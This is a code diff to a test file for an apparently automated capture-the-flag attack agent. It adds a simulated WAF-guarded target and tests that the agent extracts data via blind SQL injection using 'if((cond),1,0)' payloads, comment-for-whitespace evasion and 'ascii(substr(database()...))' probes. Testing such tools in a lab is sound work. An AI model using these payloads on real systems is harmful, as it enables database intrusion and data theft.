@@ -142,6 +142,34 @@ def _extract_condition(payload: str) -> str | None:
     return None
 
 
+def _split_top_level_commas(text: str) -> list[str]:
+    """Split ``text`` on commas that sit at paren-depth 0."""
+    parts: list[str] = []
+    depth = 0
+    start = 0
+    for i, ch in enumerate(text):
+        if ch == "(":
+            depth += 1
+        elif ch == ")":
+            depth -= 1
+        elif ch == "," and depth == 0:
+            parts.append(text[start:i])
+            start = i + 1
+    parts.append(text[start:])
+    return parts
+
+
+def _extract_if_call(payload: str) -> tuple[str, str, str] | None:
+    """Parse ``if((cond),<true>,<false>)`` into (cond, true_val, false_val)."""
+    m = re.fullmatch(r"if\((.*)\)", payload.strip())
+    if not m:
+        return None
+    args = _split_top_level_commas(m.group(1))
+    if len(args) != 3:
+        return None
+    return _strip_outer_parens(args[0]), args[1].strip(), args[2].strip()
+
+
 class _BlindRuntime:
     """A numeric-column blind-SQLi target guarded by a whitespace-blacklist WAF.
 
@@ -152,8 +180,12 @@ class _BlindRuntime:
     no boolean oracle, so the extractor must not false-positive.
     """
 
-    def __init__(self, injectable: bool = True):
+    def __init__(self, injectable: bool = True, block_ampersand: bool = False):
         self.injectable = injectable
+        # When True the WAF blacklists ``&&``/``||`` outright (HackWorld-class):
+        # every conjunction-style oracle is rejected, so only the ``if((cond),1,0)``
+        # conditional-response context can establish a boolean oracle.
+        self.block_ampersand = block_ampersand
         self.environment = SimpleNamespace(available_tools=[])
         self.requests: list[str] = []
 
@@ -162,14 +194,25 @@ class _BlindRuntime:
             return _PAGE_ROW
         if any(ws in payload for ws in _WAF_WHITESPACE):
             return _PAGE_WAF
+        # conditional-response injection: if((cond),1,0) resolves the numeric id
+        # to the valid baseline (1) when the condition holds, else a dead id (0).
+        if payload.startswith("if("):
+            call = _extract_if_call(payload)
+            if call is None:
+                return _PAGE_EMPTY
+            cond, true_val, false_val = call
+            resolved = true_val if _eval_condition(cond) else false_val
+            return _PAGE_ROW if resolved.strip() == "1" else _PAGE_EMPTY
         if "'" in payload or '"' in payload:  # wrong context for a numeric column
             return _PAGE_EMPTY
-        if "&&" not in payload and "||" not in payload:
-            return _PAGE_ROW if payload.strip() == "1" else _PAGE_EMPTY
-        cond = _extract_condition(payload)
-        if cond is None:
-            return _PAGE_EMPTY
-        return _PAGE_ROW if _eval_condition(cond) else _PAGE_EMPTY
+        if "&&" in payload or "||" in payload:
+            if self.block_ampersand:
+                return _PAGE_WAF
+            cond = _extract_condition(payload)
+            if cond is None:
+                return _PAGE_EMPTY
+            return _PAGE_ROW if _eval_condition(cond) else _PAGE_EMPTY
+        return _PAGE_ROW if payload.strip() == "1" else _PAGE_EMPTY
 
     async def browser_action(self, action: str, **kwargs):
         if action == "navigate":
@@ -267,6 +310,33 @@ async def test_blind_sqli_reconstructs_flag_through_waf(monkeypatch, tmp_path):
 
 
 @pytest.mark.asyncio
+async def test_blind_sqli_reconstructs_flag_through_ampersand_blocking_waf(monkeypatch, tmp_path):
+    """HackWorld-class WAF: ``&&`` is blacklisted, so every conjunction oracle is
+    rejected wholesale and only the ``if((cond),1,0)`` conditional-response context
+    can establish a boolean oracle. Regression guard for the capability gap found in
+    live validation (2026-08-04): the field IS boolean-blind injectable, but the
+    pre-fix repertoire (``&&`` only) read it as "no boolean oracle"."""
+    _reset_notes(tmp_path, "notes_blind_amp.json")
+    runtime = _BlindRuntime(injectable=True, block_ampersand=True)
+    dispatcher = _make_dispatcher(monkeypatch, runtime)
+
+    await dispatcher.run(target="http://ctf.local/item", goal="拿到flag", type="web", hint="")
+
+    # every conjunction-style payload was WAF-blocked, so the win must have come
+    # from a conditional-response ``if((...),1,0)`` payload (url-encoded ``if%28``).
+    assert any("if%28" in url or "if((" in url for url in runtime.requests), (
+        "expected an if()-conditional oracle payload to be sent"
+    )
+    assert any("ctf_blind_sqli_confirmed" in line for line in dispatcher._notes_log), (
+        "expected the boolean oracle to be established via the conditional context"
+    )
+    assert any("ctf_blind_sqli_extract" in line for line in dispatcher._notes_log), (
+        "expected the reconstructed flag to be verified despite the && blacklist"
+    )
+    _cleanup_notes()
+
+
+@pytest.mark.asyncio
 async def test_blind_sqli_does_not_false_positive_when_not_injectable(monkeypatch, tmp_path):
     _reset_notes(tmp_path, "notes_blind_safe.json")
     runtime = _BlindRuntime(injectable=False)
@@ -293,6 +363,18 @@ def test_blind_wrap_payload_is_whitespace_free_and_uses_ampersand_logic():
     assert _blind_wrap_payload("numeric", "1=1", "/**/") == "1/**/&&/**/(1=1)/**/"
     assert _blind_wrap_payload("string_single", "1=1", "/**/").startswith("1'")
     assert _blind_wrap_payload("string_single", "1=1", "/**/").endswith("#")
+
+
+def test_blind_wrap_payload_conditional_if_uses_no_conjunction_operator():
+    # HackWorld-class bypass: the whole numeric parameter becomes if((cond),1,0);
+    # separator is irrelevant because no logic operator is synthesised.
+    for sep in (" ", "/**/", "\t"):
+        payload = _blind_wrap_payload("conditional_if", "ascii(substr((database()),1,1))>77", sep)
+        assert payload == "if((ascii(substr((database()),1,1))>77),1,0)"
+        assert " " not in payload and "\t" not in payload and "\n" not in payload
+        assert "&&" not in payload and "||" not in payload
+        assert " and " not in payload.lower() and " or " not in payload.lower()
+    assert _blind_wrap_payload("conditional_if", "1=1", "/**/") == "if((1=1),1,0)"
 
 
 def test_blind_substr_and_char_helpers_have_comma_and_ansi_forms():
